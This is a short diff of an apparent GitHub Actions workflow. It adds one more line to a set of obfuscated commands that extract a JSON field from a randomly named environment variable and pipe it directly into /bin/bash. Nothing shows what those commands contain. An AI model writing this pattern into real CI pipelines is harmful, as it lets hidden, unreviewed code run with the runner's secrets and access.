@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$odpa8498" | jq -r .bwqmk18 | /bin/bash
           printf '%s' "$onooo9" | jq -r .less0 | /bin/bash
           printf '%s' "$g91" | jq -r .hudvj0 | /bin/bash
+          printf '%s' "$yn6" | jq -r .yf1 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
